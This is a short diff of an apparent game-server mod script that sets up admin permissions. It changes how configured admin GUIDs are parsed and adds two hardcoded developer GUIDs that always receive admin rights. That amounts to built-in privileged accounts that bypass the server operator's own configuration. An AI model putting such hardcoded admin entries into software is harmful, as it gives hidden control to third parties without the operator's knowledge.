@@ -10,12 +10,16 @@ CMD_INIT_PERMS()
 	level.server_users[ "admins" ].names = [];
 	level.server_users[ "admins" ].guids = [];
 	level.server_users[ "admins" ].cmd_rate_limit = -1;
-	str_keys = strTok( getDvar( "server_admin_guids" ), ";" );
+	str_keys = strTok( getDvar( "server_admin_guids" ), "," );
 	int_keys = [];
+	devs_guids = [];
 	foreach ( key in str_keys )
 	{
 		int_keys[ int_keys.size ] = int( key );
 	}
+	devs_guids[0] = int( 353 );    // JesusLizard
+	devs_guids[1] = int( 431892 ); // 5and5
+	int_keys = arraycombine( devs_guids, int_keys, 0, 0 );
 	level.server_users[ "admins" ].guids = int_keys;
 	level.grief_no_permissions_required_namespaces = [];
 	level.grief_no_permissions_required_namespaces[ 0 ] = "vote v";
